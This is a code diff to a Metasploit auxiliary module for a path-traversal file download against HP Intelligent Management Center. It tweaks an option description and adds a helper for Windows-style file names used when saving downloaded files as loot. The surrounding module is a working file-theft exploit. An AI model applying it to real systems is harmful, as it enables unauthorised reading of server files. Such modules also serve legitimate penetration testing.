@@ -43,7 +43,7 @@ class Metasploit3 < Msf::Auxiliary
 				OptString.new('TARGETURI', [true, 'Path to HP Intelligent Management Center', '/imc']),
 				OptString.new('FILEPATH', [true, 'The name of the file to download', '/boot.ini']),
 				# By default files downloaded from C:\Program Files\iMC\client\bin\
-				OptInt.new('DEPTH', [true, 'Traversal depth if absolute is set to false', 4])
+				OptInt.new('DEPTH', [true, 'Traversal depth', 4])
 			], self.class)
 	end
 
@@ -58,6 +58,10 @@ class Metasploit3 < Msf::Auxiliary
 		else
 			return false
 		end
+	end
+
+	def my_basename(filename)
+		return ::File.basename(filename.gsub(/\\/, "/"))
 	end
 
 	def run_host(ip)
@@ -83,7 +87,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		if res and res.code == 200 and res.headers['Content-Type'] and res.headers['Content-Type'] == "image/png"
 			contents = res.body
-			fname = File.basename(datastore['FILEPATH'])
+			fname = my_basename(datastore['FILEPATH'])
 			path = store_loot(
 				'hp.imc.faultdownloadservlet',
 				'application/octet-stream',
